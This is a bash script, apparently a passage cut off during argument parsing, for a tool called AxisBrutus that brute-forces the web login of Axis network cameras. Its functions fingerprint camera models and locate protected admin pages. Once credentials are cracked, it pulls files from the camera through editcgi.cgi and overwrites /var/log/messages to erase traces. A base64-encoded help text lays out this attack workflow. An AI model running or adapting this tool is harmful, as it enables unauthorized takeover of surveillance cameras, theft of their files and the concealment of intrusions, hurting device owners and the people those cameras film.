#!/bin/bash
# CHORFA Alla-eddine
# h4ckr213dz@gmail.com
# https://github.com/dino213dz/
# Créé le 25.07.2019
#
####################################################################################################################
#                                                     AxisBrutus
####################################################################################################################
ab_auteur='CHORFA Alla-eddine'
ab_date_creation='25.07.2019'
ab_date_maj=$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 6)" "$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 7|rev|cut -d ":" -f 2-|rev)
ab_titre='AxisBrutus'
ab_ver='2.5'
ab_contact='h4ckr213dz@gmail.com'
ab_web='https://github.com/dino213dz/'
ab_slogan='La plus fine des brutes!'
ab_slogan_bravo="\t \tLa brute a encore frappé!"
ab_slogan_defaite="Ce minus a esquivé toutes nos frappes! Donne moi plus de mots-de-passes et plus de logins à manger si tu veux qu'on gagne!"


####################################################################################################################
#                                                      VARIABLES
####################################################################################################################


#Inti. var. styles
rouge='\033[1;31m'
rouge_fonce='\033[0;31m'
jaune='\033[1;33m'
jaune_fonce='\033[0;33m'
vert='\033[1;32m'
vert_fonce='\033[0;32m'
cyan='\033[1;36m'
cyan_fonce='\033[0;36m'
bleu='\033[1;34m'
bleu_fonce='\033[0;34m'
magenta='\033[1;35m'
magenta_fonce='\033[0;35m'
blanc='\033[1;37m'
gris='\033[0;37m'
noir='\033[0;30m'
fond_rouge='\033[1;41m'
fond_jaune='\033[1;43m'
fond_vert='\033[1;42m'
fond_cyan='\033[1;46m'
fond_bleu='\033[1;44m'
fond_magenta='\033[1;45m'
fond_blanc='\033[1;47m'
fond_noir='\033[1;40m'

italic='\033[3m'
souligne='\033[4m'
reset='\033[0m'

#sources
source config/axisBrutus.lang
source config/axisBrutus.conf

horodate="$(/bin/date "+%s")"
modele_nondetecte='AXIS inconnu inconnu'
fichier_mdp_trouve=$fichier_mdp_trouve_default
fichier_logs=$fichier_logs_defaut

#Inti. var. travail
curl_timeout=$curl_timeout_default
curl_maxtime=$curl_maxtime_default
ping_timeout=$ping_timeout_default
min_timeout=3
succes='Administration'
echec='Unauthorized'
heure_depart=$(/bin/date +%s)
mdp_trouve=''
echec_js=''
echec_404=''
skipModeleDetect='NON'
skipGeo='NON'
skipIfInHistory='NON'
checkOnly='NON'
modeVerbose='NON'
total_fait=0
modeles_verifie=''
urlforced=''
exportforced=''
args=("$@")
nb_args=$#

#liste des modeles testés
liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" "210A" "211" "211M" "212" "213" "214" "215" "221" "223M" "225FD" "233D" "243SA" "240Q" "241Q" "241S" "247S" "2100" "2110" "2120" "2401" "2401+" "F44" "M1004-W" "M1011" "M1011-W" "M1013" "M1014" "M1025" "M1031-W" "M1034-W" "M1054" "M1065-L" "M1104" "M1113" "M1114" "M1124" "M1125" "M20" "M2025-LE" "M3004" "M3005" "M3006" "M3007" "M3011" "M3024-L" "M3025" "M3026" "M3027" "M3045-V" "M3104-LVE" "M3113" "M3204" "M5014" "M5014-V" "M7001" "M7011" "M7014" "M7016" "P12" "P12/M20" "P1343" "P1344" "P1346" "P1347" "P1354" "P1355" "P1357" "P1365" "P1405-LE" "P1425-E" "P1427-LE" "P1428-E" "P3224-LV" "P3225-LVE" "P3304" "P3343" "P3344" "P3346" "P3354" "P3363" "P3364" "P3364-L" "P3365" "P3367" "P5414-E" "P5415-E" "P5512" "P5512-E" "P5532" "P5532-E" "P5534-E" "P5635-E" "P7214" "Q1604" "Q1755" "Q1765-LE" "Q1775" "Q6032-E" "Q6034-E" "Q6035-E" "Q6042" "Q6042-E" "Q6044-E" "Q6045-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q7401")

####################################################################################################################
#                                                       FONCTIONS
####################################################################################################################



#FUNCTION:
# detecte si erreur 401 : page non autorisée
function checkConnectiviteCible {
	#ping_timeout=10
	packets_perdus=$(/bin/ping -W $ping_timeout -c 1 $ip_only 2>/dev/null|grep '%'|cut -d ' ' -f 6|cut -d '%' -f 1)
	packets_perdus=$(echo $packets_perdus|egrep "[0-9]*")
	if [ "$packets_perdus" != "" ];then
		if [ $packets_perdus -ne 0 ];then
			echo "ECHEC"
		else
			echo "SUCCES"
		fi
	else
		echo "ECHEC"
	fi
	}

#FUNCTION:
# detecte le modele de la camera axis et la version du firmware si disponible: <AXIS modele Network Camera X.XX>
# elle recupere l'info depuis la balise <TITLE> de la fenetre
# l'url ciblee depend du modele de la camera
function fullModeleDetect {

	ip_cam=$1
	
	url_a_verifier=( "/index2.shtml" "/view/index.shtml" "/view/index2.shtml?newstyle=&cam=" "/view/view.shtml?id=354&imagepath=%2Fmjpg%2Fvideo.mjpg&size=1" "/view/viewer_index.shtml" "/admin/admin.shtml" "/" )

	
	for url_possible in ${url_a_verifier[*]}; do	
		modele_complet=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -k -s "http://$ip_cam$url_possible"  |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)	
				
		if [[ "$modele_complet" = "" ]] ||  [[ "$modele_complet" = " " ]] || [[ -z "${modele_complet##*Bad*}" ]] || [[ -z "${modele_complet##*Index*}" ]] || [[ -z "${modele_complet##*Unauthorized*}" ]] ||   [[ -z "${modele_complet##*Not*}" ]]  ||  [[ -z "${modele_complet##*page*}" ]] ;then
			modele_complet=$modele_nondetecte
			continue
		else 
			break
		fi

	done

	echo $modele_complet
	}



#FUNCTION:
# detecte si erreur 401 : page non autorisée
function checkUrlProtegee {
	url_checker_p=$1	
	test_url_p=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_p|grep -i '401 ')
	if [ ${#test_url_p} -gt 0 ];then
		protegee='OUI'
	else
		protegee="NON"
	fi
	echo $protegee
	}

#FUNCTION:
# detecte si erreur 404 : page introuvable
function checkUrlExiste {
	url_checker_e=$1	
	test_url_e=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_e|grep -i '404 ')
	if [ ${#test_url_e} -gt 0 ];then
		existe="NON"
	else
		existe='OUI'
	fi
	echo $existe
	}

#FUNCTION:
# detecte le modele de la camera axis
function modeleExtract {
	#pb ici : les modeles ne sont plus corrects suite à la creation des fonctions
	m_c_cam="$1"
	m_c_cam=$(echo -e "$m_c_cam"|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
	m_c_cam=${m_c_cam/.*[aA][xX][iI][sS]/axis}
	echo -e "$m_c_cam"

	}

#FUNCTION:
# detecte la version du firmware
function versionDetect {
	v_c_cam=$1	
	v_c_cam=$(echo $v_c_cam|rev|cut -d " " -f 1|rev)
	echo $v_c_cam

	}

#FUNCTION:
# definit l'url à attaquer selon le modele
function urlModele {
	ip_cam=$1	
	modele_cam=$2	
	# modele par defaut : le plus commun	
	url_cam="http://$ip_cam/operator/basic.shtml"

	# old generation
	if  [ "$modele_cam" = "2100" ] || [ "$modele_cam" = "2110" ] || [ "$modele_cam" = "2120" ] || [ "$modele_cam" = "2401+" ] || [ "$modele_cam" = "2401" ];then 
		url_cam="http://$ip_cam/admin/admin.shtml" 
	fi

	# AXIS Q6055-E : contient du JS
	if [ "$modele_cam" = "Q6054-E" ] ;then 
		url_cam="http://$ip_cam/axis-cgi/admin/paramlist.cgi"
	fi

	# AXIS P3367
	#if [ "$modele_cam" = "P3367" ] ;then 
	#	url_cam="http://$ip_cam/operator/videostream.shtml?id=1312"
	#fi
	
		
	# Page introuvable
	if [[ "$modele_cam" =~ "N/A" ]] || [[ "$modele_cam" =~ "inconnu" ]] || [[ "$modele_cam" = "" ]] || [[ "$modele_cam" = " " ]];then 
		url_tester_aleatoirement=( "/operator/basic.shtml" "/admin/admin.shtml" "/admin/users.shtml" "/view/indexFrame.shtml" "" )
		#echo $url_tester_aleatoirement
		test_url_existe='NON'
		test_url_protect='NON'
		for url_de_test in ${url_tester_aleatoirement[*]} ;do
			url_cam="http://$ip_cam$url_de_test"
			test_url_existe=$(checkUrlExiste $url_cam)
			if [ "$test_url_existe" = 'OUI' ];then
				test_url_protect=$(checkUrlProtegee $url_cam)
				if [[ "$test_url_protect" =~ 'OUI' ]];then
					break
				fi
			fi
		done
	fi
	
	#si quand meme on ne trouve pas de page protegee a attaquer: on attaque la racine directement
	test_url=$(checkUrlExiste $url_cam)
	if [[ "$test_url" =~ 'NON' ]]; then 
		url_cam="http://$ip_cam/"
	fi
	echo $url_cam
	}

#FUNCTION:
# 
function infosGeolocalisation {
	ip_port=$1
	ip_only=${ip_port%:*}

	infosDbIpDotCom=$(/usr/bin/curl -ks $url_geo_api$ip_only)

	#retirer les infos inutiles
	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
	#infosDbIpDotCom=${infosDbIpDotCom/continentCode*countryName:/'Pays:'}
	

	#Mise en forme pour le script
	infosDbIpDotCom=${infosDbIpDotCom/'}'/''}
	infosDbIpDotCom=${infosDbIpDotCom/'{'/''}
	infosDbIpDotCom=${infosDbIpDotCom//'"'/''}	
	
	#Traduction
	infosDbIpDotCom=${infosDbIpDotCom/'continentCode:'/"$geo_continentCode:"}
	infosDbIpDotCom=${infosDbIpDotCom/'continentName:'/"$geo_continentName:"}
	infosDbIpDotCom=${infosDbIpDotCom/'countryCode:'/"$geo_countryCode:"}
	infosDbIpDotCom=${infosDbIpDotCom/'countryName:'/"$geo_countryName:"}
	infosDbIpDotCom=${infosDbIpDotCom/'stateProvCode:'/"$geo_stateProvCode:"}
	infosDbIpDotCom=${infosDbIpDotCom/'stateProv:'/"$geo_stateProv:"}
	infosDbIpDotCom=${infosDbIpDotCom/'city:'/"$geo_city:"}

	echo $infosDbIpDotCom
	}

#FUNCTION:
# 
function addZeros {
	nombre_max=$1
	nombre_actuel=$2	
	serie_de_zeros=''

	nb_zeros=$(( ${#nombre_max} - ${#nombre_actuel} -1 ))
	for noz in $(seq 0 $nb_zeros); do
		serie_de_zeros="0"$serie_de_zeros
	done

	echo $serie_de_zeros$nombre_actuel
	}

#FUNCTION:
# verifie l'existence des fichiers
function fichierExiste {
	fichier_a_verifier=$1

	if [[ -f $fichier_a_verifier ]];then
		resultat='OUI'
	else
		resultat='NON'
	fi
	
	echo $resultat
	}

#FUNCTION:
# verifie l'existence des fichiers
function effacerTraces {
	ip_cam=$1
	
	fichiers_a_vider=('/var/log/messages' '/var/log/messages.old')

	fichier_temp='/tmp/fichier_vole_'$horodate'.txt'	
	contenu=$(echo -e $banniere_logs|base64 -d)
	
	for fic_a_vid in ${fichiers_a_vider[*]} ;do
		/usr/bin/curl -ks "http://$ip_cam/admin-bin/editcgi.cgi?file=$fic_a_vid" -d "save_file=$fic_a_vid&mode=0100666&concol_succes_crlf_to_lf=on&submit= Save file &content=$contenu" --connect-timeout $curl_timeout --max-time $curl_maxtime --user $user:$mdp > $fichier_temp 
	done
	
	}

#FUNCTION:
# verifie l'existence des fichiers
function voleFichier {
	ip_cam=$1
	fichier_a_voler=$2
	fichier_temp='/tmp/fichier_vole_'$horodate'.txt'
	url_vole="http://$ip_cam/admin-bin/editcgi.cgi?file=$fichier_a_voler"
	/usr/bin/curl -ks --connect-timeout $curl_timeout --max-time $curl_maxtime "$url_vole" --user $user:$mdp  > $fichier_temp #silent_get=$()
	fichier_vole=''
	record=''
	while read ligne; do
		if [[ "$ligne" =~ '</textarea' ]];then
			record='OFF'
			fichier_vole=$fichier_vole${ligne/'</textarea>'/''}"\n"
		fi
		if [[ "$record" = "ON" ]];then
			#ligne vides?!
			#if [[ "${ligne// /}" != "" ]];then
				#fichier_vole=$fichier_vole$ligne"\n"
			fichier_vole=$fichier_vole${ligne//\\r/\\n}"\n"
			#fi
		fi

		if [[ "$ligne" =~ '<textarea' ]];then
			record='ON'
		fi
		
	done < $fichier_temp

	echo -en $fichier_vole

	}


#FUNCTION:
# verifie l'existence des fichiers
function ajouterEspacesSlogans {
	texte="$1"
	espaces="$2"
	banniereEnUneLigne=$(echo -e $banniere|base64 -d)

	largeurTexte=${#texte}
	largeurBanniere=$(( ${#banniereEnUneLigne}/10 ))
	tailleEspaces=$(( $largeurBanniere - $largeurTexte ))

	for e in $(seq 1 $tailleEspaces); do 
		espaces=$espaces$italic" "
	done
	
	echo $espaces
	}


#FUNCTION:
# verifie l'existence des fichiers
function afficherAide {
	aide_texte="CiMgQVhJUyBCUlVUVVMKCiMjIEEgcHJvcG9zOgotIEF1dGV1cjogQ0hPUkZBIEFsbGEtZWRkaW5lCi0gQ3LDqWUgbGU6IDI1LjA3LjIwMTkKLSBFZGl0w6kgbGU6IDA1LjA4LjIwMTkKLSBWZXJzaW9uOiAyLjUKLSBDb250YWN0OiBoNGNrcjIxM2R6QGdtYWlsLmNvbQotIFdlYjogaHR0cDovL2Rpbm8yMTNkei5mcmVlLmZyCgojIyBEZXNjcmlwdGlvbjoKLSBMYSBwbHVzIGZpbmUgZGVzIGJydXRlcyEKLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwotIE7DqWNlc3NpdGUgdW4gZmljaGllciBkZSBtb3RzLWRlLXBhc3NlIGV0IHVuIGZpY2hpZXIgdXNlcm5hbWVzIDoKCTEtIC4vd29yZGxpc3RzL2F4aXNfdXNlcnMudHh0CgkyLSAuL3dvcmRsaXN0cy9heGlzX21kcC50eHQKLSBDZXMgZmljaGllcnMgY29udGllbm5lbnQgbGVzIGxvZ2lucyBldCBtb3QtZGUtcGFzc2UgcGFyIGTDqWZhdXQgZGVzIGNhbcOpcmFzIEF4aXMuCgojIyBBbGdvcml0aG1lOgotIFbDqXJpZmllciBsZXMgZMOpcGVuZGFuY2VzCi0gVmVyaWZpZXIgbGVzIHBhcmFtw6h0cmVzIGV0IGxlcyBmaWNoaWVycwotIFZlcmlmaWVyIGwnaGlzdG9yaXF1ZQotIFZlcmlmaWVyIGxhIGNvbm5lY3Rpdml0w6kgZGUgbGEgY2libGUKLSBSw6ljdXBlcmVyIGxlIG1vZMOobGUgZGUgbGEgY2Ftw6lyYQotIFJlY3VwZXJlciBsZSBmaXJtd2FyZQotIFJlY2hlcmNoZSBkJ1VSTCBwcm90w6lnw6llIHBhciBtb3QtZGUtcGFzc2UKLSBCcnV0ZSBmb3JjZQotIFNpIG1vdCBkZSBwYXNzZSB0cm91dsOpOgoJLSBUw6lsw6ljaGFyZ2VyIGxlcyBmaWNoaWVycyBkZSBjb25maWd1cmF0aW9uCgktIFNhdXZlZ2FyZGUgZGVzIGRvbm7DqWVzCgktIEVmZmFjZXIgbGVzIGxvZ3MKCiMjIFN5bnRheGU6Ci0gJD4gLi9heGlzQnJ1dHVzLnNoIC1jIElQOlBPUlQgW09QVElPTlNdCgojIyBPcHRpb25zL1BhcmFtZXRyZXM6CiMjIyBQYXJhbcOodHJlcyBvYmxpZ2F0b2lyZXM6Ci0gLS1jaWJsZSwgLWMgOiBJUCwgSVA6UE9SVCwgVVJMCiMjIyBQYXJhbWV0cmVzIG9wdGlvbm5lbHM6Ci0gLS1za2lwLCAtcyA6IE4nZWZmZWN0dWUgcGFzIGxhIGTDqXRlY3Rpb24gZHUgbW9kw6hsZS4gTCd1cmwgY2libGUgc2VyYSAiL29wZXJhdG9yL2Jhc2ljLnNodG1sIiBxdWkgZXN0IGxhIHBsdXMgcHJvYmFibGUuIEwnYXJndW1lbnQgLS11cmwgcGV1dCDDqnRyZSB1dGlsaXPDqSBwb3VyIGNoYW5nZXIgbCd1cmwgY2libGUuCi0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2TDqGxlcyBkZSBjYW3DqXJhIGNvbXBhdGlibGVzCi0gLS1oZWxwLCAtaCA6IGFmZmljaGUgbCdhaWRlCi0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKLSAtLWNoZWNrLCAtLWNoayA6IFbDqXJpZmllIHVuaXF1ZW1lbnQgbGEgY29tcGF0aWJpbGl0w6kgZCd1biBtb2TDqGxlIHNhbnMgcHJvY8OpZGVyIMOgIGwnYXR0YXF1ZQotIC0tbG9nLCAtLWxvZ3MgOiBEw6lmaW5pdCBsJ2VtcGxhY2VtZW50IGR1IGZpY2hpZXIgbG9ncyBkZXMgb3DDqXJhdGlvbnMgZCdhdHRhcXVlLiBMYSB2YWxldXIgcGFyIGTDqWZhdXQgZXN0IDogLi9heGlzQnJ1dHVzLmxvZwotIC0tcGFzc3dvcmRzLCAtcCA6IGZpY2hpZXIgd29yZGxpc3QgY29udGVuYW50IGxhIGxpc3RlIGRlcyBtb3RzLWRlLXBhc3NlCi0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwotIC0tZXhwb3J0LCAtLW91dHB1dCwgLW8gOiBmaWNoaWVyIGRhbnMgbGVxdWVsIGxlIG1vdC1kZS1wYXNzZSBzZXJhIGVucmVnaXN0csOpIHMnaWwgZXN0IHRyb3V2w6kuIEF1Y3VuIGZpY2hpZXIgY3LDqcOpIHNpIGxlIG1vdC1kZS1wYXNzZSBuJ2VzdCBwYXMgdHJvdXbDqQotIC0tdXJsLCAtciA6IEwndXJsIGTDqXBlbmQgZHUgbW9kw6hsZS4gVm91cyBwb3V2ZXogbGUgbW9kaWZpZXIgc2kgdm91cyBzb3VoYWl0ZXogdGVzdGVyIHVuZSBwYWdlIHdlYiBiaWVuIHByw6ljaXNlIChjYXMgZCd1biBtb2TDqGxlIGluY29ubnUgcGFyIGV4ZW1wbGUpCi0gLS12ZXJib3NlLCAtdiA6IHBlcm1ldCBkJ2FmZmljaGVyIHBsdXMgb3UgbW9pbnMgZCdpbmZvcyDDoCBsJ8OpY3Jhbi4gU2kgdmVyYmV1eCBhbG9ycyA6IEdhcmRlIMOgIGwnZWNyYW4gbGVzIGNvbWJpbmFpc29ucyB0ZXN0w6llcyAmIGFmZmljaGUgbGUgY29udGVudSBkZXMgZmljaGllcnMgdMOpbMOpY2hhcmfDqXMKLSAtLXRpbWVvdXQsIC10IDogZMOpZmluaXQgbGUgdGVtcHMgZGUgcsOpcG9uc2UgbGltaXRlIGRhbnMgY3VybAotIC0tbWF4dGltZSwgLW0gOiBkw6lmaW5pdCBsZSB0ZW1wcyBsaW1pdGUgZCd1bmUgcmVxdcOqdGUgY3VybAotIC0tcGluZy10aW1lb3V0IDogZMOpZmluaXQgbGUgdGltZW91dCBkdSB0ZXN0IGRlIGNvbm5lY3Rpdml0w6kgKHBpbmcpCi0gLS1pZ25vcmUsIC1pIDogaWdub3JlciBsZSByw6lzdWx0YXQgZHUgdGVzdCBkZSBjb25uZWN0aXZpdMOpIChhdHRhcXVlciBkYW5zIHRvdXMgbGVzIGNhcykKLSAtLWhpc3QtYnJlYWssIC0taGlzdG9yeS1icmVhayA6IFNhdXRlciBsZXMgY2libGVzIHByw6lzZW50ZXMgZGFucyBsJ2hpc3RvcmlxdWUuIEwnaGlzdG9yaXF1ZSBlc3Qgc3RvY2vDqSBkYW5zIGxlIGZpY2hpZXIgIi4vYXhpc0JydXR1cy5oaXN0b3J5Ii4KCiMjIEV4ZW1wbGVzOgojIyMgQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybDoKLSBMZXMgd29yZGxpc3QgdXRpbGlzw6lzIGljaSBzb250IGNldXggcGFyIGTDqWZhdXQuIChWb2lyICJEZXNjcmlwdGlvbiIpCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSBodHRwOi8vMTkyLjIzLjM2LjI1NDo4MwoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cHM6Ly9tYUNhbWVyYUlwMjEzZHouYXhpcy5jb20vCiMjIyBBZmZpY2hlciBsYSBsaXN0ZSBkZXMgbW9kw6hsZXMgY29tcGF0aWJsZXM6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbGlzdAojIyMgUGFzIGRlIGfDqW9sb2NhbGlzYXRpb24KCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1uby1nZW8KIyMjIFBhcyBkZSBkw6l0ZWN0aW9uIGR1IG1vZMOobGU6Ci0gT24gZMOpZmluaXQgbGUgVEFSR0VUVVJJIG1hbnVlbGxlbWVudC4gcGV1dCBzZXJ2aXIgcG91ciBhdHRhcXVlciBkJ2F1dHJlcyB0eXBlIGRlIGNhbWVyYXMuIGR1IG1vbWVudCBxdSdpbCBzJ2FnaXNzZSBkJ3VuZSBwYWdlIHByb3RlZ8OpZSBwYXIgdWVuIGF1dGhlbnRpZmljYXRpb24gaHR0cCBzaW1wbGUuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKIyMjIERlZmluaXIgdW5lIGxpc3RlIGRlIGxvZ2luIG1vdC1kZS1wYXNzZToKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1wYXNzd29yZHMgLi9heGlzX3Bhc3MudHh0IC0tdXNlcm5hbWVzIC4vYXhpc191c2VybmFtZXMudHh0CiMjIyBEw6lmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0IC0tdmVyYm9zZQojIyMgRmljaGllciBsb2dzIGQnYXR0YXF1ZToKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1sb2cgLi90ZXN0LmxvZwojIyMgTW9kZSB2ZXJiZXV4IDoKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS12ZXJib3NlCiMjIyBQYXJhbcOpdHJhZ2UgY3VybDoKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1tYXh0aW1lIDEwIC0tdGltZW91dCA0CiMjIy0gUGFyYW3DqXRyYWdlIHBpbmc6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tcGluZy10aW1lb3V0IDQKIyMjIE5lIHBhcyBhdHRhcXVlciBsZXMgSVAgcHLDqXNlbnRlcyBkYW5zIGwnaGlzdG9yaXF1ZToKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1oaXN0LWJyZWFrCgoK"
	echo -e $banniere_aide$aide_texte|base64 -d
	}

#FUNCTION:
# verifie que les entetes sont presents
#DATE		HEURE		IP:PORT			CATEGORIE	MESSAGE
#--------	--------	----------------	-----------	----------------------------------
function logEnteteCheck {
	premiere_ligne=$(head -n 1 $fichier_logs)
	
	if [[ "$premiere_ligne" =~ "IP:PORT" ]];then
		check='OK'
	else
		check='ERROR'
		echo -e $logs_labels > $fichier_logs
	fi

	}

#FUNCTION:
# verifie l'existence des fichiers
function logMessage {
	log_msg=$1 #message
	log_type=$2 #type: info, erreur, alerte...etc
	log_ip=$ip
	log_date=$(/bin/date "+%D")
	log_heure=$(/bin/date "+%T")
	log_taille_max_colonne=16
	log_taille_min_colonne=10
	
	if [ ${#log_ip} -lt $log_taille_max_colonne ];then
		log_ip="$log_ip\t"
	fi

	if [ ${#log_ip} -lt $log_taille_min_colonne ];then
		log_ip="$log_ip\t"
	fi

	log_ligne="$log_date\t$log_heure\t$log_ip\t$log_type\t$log_msg"	

	echo -e $log_ligne >> $fichier_logs
	}

function echox	{
	tput cuu1;tput el;echo -e "$1"
	}

function checkHistory	{
	newip=$ip
	
	if [ -f "$fichier_hist_defaut" ];then
		test=$(cat $fichier_hist_defaut|grep "$newip")
		
		if [ ${#test} -gt 0 ];then
			echo "$test"		
		else
			echo "FALSE"
		fi
	else
		touch $fichier_hist_defaut
		echo "FALSE"
	fi
	
	}

function afficherBarre {
	#entiers
	fb_fait=$1
	fb_total=$2
	fb_total_txt="-$fb_total-"
	fb_total_t=$(( 10 ** ((${#fb_total_txt})-3) ))
	taille_barre=$taille_barre_progression
	#texte
	fb_barre=''
	#calcul: pourcentage fait : unites
	fb_pourcent_fait_pct=$(( ($fb_fait*100) / $fb_total ))
	fb_pourcent_fait_pct_txt=$(addZeros 100 $fb_pourcent_fait_pct)	
	fb_fait_txt=$(addZeros $fb_total_t $fb_fait)	
	fb_taille_barre_fait=$(( ($fb_pourcent_fait_pct*$taille_barre) / 100 ))
	#generation: barre de progression (à 100%)
	for x in $(seq 1 $taille_barre);do
		fb_barre=$fb_barre""$barre_car_fait""
	done


	#generation: textes
	txt_fait_sur_total="$fb_fait_txt/$fb_total" 	
	txt_fb_pourcent_fait_pct="$fb_pourcent_fait_pct_txt%"
	texte="[$txt_fb_pourcent_fait_pct][$txt_fait_sur_total]"
	#texte="[$txt_fb_pourcent_fait_pct]"
	#calcul: taille et position du texte (milieu de la barre)
	taille_txt=${#texte}
	pos_txt=$(( ($taille_barre-$taille_txt)/2 ))
	#generation: parties de la barre avant et apres le texte
	fb_barre_A=${fb_barre:0:$pos_txt}
	fb_barre_B=${fb_barre_A//$barre_car_fait/$barre_car_restant}
	#generation: (avant barre)+(texte)+(apres barre)
	fb_barre_texte="$fb_barre_A$texte$fb_barre_B"
	#generation: barre, partie "pourcent accomplie" (partie "faite")
	barres_fait=${fb_barre_texte:0:$fb_taille_barre_fait}
	#generation: barre, partie "pourcent restant" (partie "restante")
	nb_barres_restantes=$(( $taille_barre-$fb_taille_barre_fait ))
	barres_restantes=${fb_barre_texte:$fb_taille_barre_fait:$nb_barres_restantes}
	#barres_restantes=${barres_restantes//$barre_car_fait/$barre_car_restant}

	barre_progression=$barre_col_fait""$barres_fait""$barre_col_restant""$barres_restantes""
	barre_progression="$barre_progression\033[0m"
	
	echo -e $barre_progression
	}
####################################################################################################################
#                                                       ARGUMENTS
####################################################################################################################
#recuperation et traitement des arguments
for no_arg in $(seq 0 $nb_args); do
	valeur=${args[$no_arg]}
	if [ ${#valeur} -gt 0 ];then

		#parametre speciaux
		#affichage aide 
		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
			echo -e "$ab_titre \t-\t Ver. $ab_ver du $ab_date_maj"
			afficherAide
			exit
		fi
		#lister les modeles testés
		if [ "$valeur" = "--list" ] || [ "$valeur" = "-l" ];then
			echo -e "# "${models_list_title//"__TOTALMODELS__"/${#liste_modeles_verifies[*]}}""
			for mod in ${liste_modeles_verifies[*]}; do
				echo -e " - AXIS $mod Network Camera"
			done
			exit
		fi
		#sauter la verification du modele
		if [ "$valeur" = "--skip" ] || [ "$valeur" = "-s" ];then
			skipModeleDetect='OUI'
		fi

		#cible attaquée: ip, ip:port, url
		#parametre obligatoire
		if [ "$valeur" = "--cible" ] || [ "$valeur" = "-c" ];then
			ip=${args[$(($no_arg+1))]}
			ip=${ip/https:\/\//}
			ip=${ip/http:\/\//}
			ip=${ip//\//}
			ip_only=${ip%:*}
		fi
		#parametres optionnels

		#TARGETURI definie manuellement
		if [ "$valeur" = "--url" ] || [ "$valeur" = "-r" ];then
			urlforced='OUI'
			targeturi=${args[$(($no_arg+1))]}
			if [ "${targeturi:0:1}" = "/" ]; then
				url="http://$ip$targeturi"			
			else
				url="http://$ip/$targeturi"
			fi
		fi
		#wordlist usernames définie
		if [ "$valeur" = "--usernames" ] || [ "$valeur" = "-u" ];then
			users_wordlist=${args[$(($no_arg+1))]}
			nb_users=$(cat $users_wordlist|wc -l)
		fi
		#wordlist mdp définie
		if [ "$valeur" = "--passwords" ] || [ "$valeur" = "-p" ];then
			mdp_wordlist=${args[$(($no_arg+1))]}
			nb_mdp=$(cat $mdp_wordlist|wc -l)
		fi
		#fichier destination si mdp trouvé
		if [ "$valeur" = "--export" ] || [ "$valeur" = "--output" ] || [ "$valeur" = "-o" ];then
			exportforced='OUI'
			fichier_mdp_trouve=${args[$(($no_arg+1))]}
		fi
		#sauter la geolocalisation
		if [ "$valeur" = "--no-geo" ] || [ "$valeur" = "--nogeo" ] || [ "$valeur" = "-g" ];then
			skipGeo='OUI'
		fi
		#fichier logs
		if [ "$valeur" = "--log" ] || [ "$valeur" = "--logs" ];then
			fichier_logs=${args[$(($no_arg+1))]}
		fi
		#mode verbeux
		if [ "$valeur" = "--verbose" ] || [ "$valeur" = "-v" ] ;then
			modeVerbose='OUI'
		fi
		#Ignorer le test de connectivité
		if [ "$valeur" = "--ignore" ] || [ "$valeur" = "-i" ] ;then
			noPing='OUI'
		fi
		#parametres optionnels informatifs/pas d'attaques/quitte apres avoir executé l'option

		#configuration requetes http(curl) 
		if [ "$valeur" = "--timout" ] || [ "$valeur" = "-t" ];then
			curl_timeout=${args[$(($no_arg+1))]}
			if [ $curl_timeout -lt $min_timeout ];then
				curl_timeout=$min_timeout
			fi
		fi
